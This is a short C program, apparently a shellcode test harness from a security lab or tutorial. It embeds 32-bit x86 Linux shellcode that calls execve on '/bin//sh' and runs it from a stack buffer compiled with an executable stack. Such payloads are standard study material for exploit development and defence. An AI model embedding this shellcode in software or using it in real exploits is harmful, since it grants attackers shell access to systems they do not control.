// shellcode.c
// gcc -z execstack -o shellcode shellcode.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
"\x31\xc0"                   // xor    %eax,%eax
 "\x50"                      // push   %eax
 "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
 "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
 "\x89\xe3"                 //  mov    %esp,%ebx
 "\x89\xc1"                 //  mov    %eax,$ecx
 "\x31\xd2"                //   xor %edx, %edx
 "\xb0\x0b"                //   mov    $0xb,%al
 "\xcd\x80"                //   int    $0x80
;

int main(int argc, char **argv){
  char buf[sizeof(code)];
  strcpy(buf, code);
  ((void(*)())buf)();
}
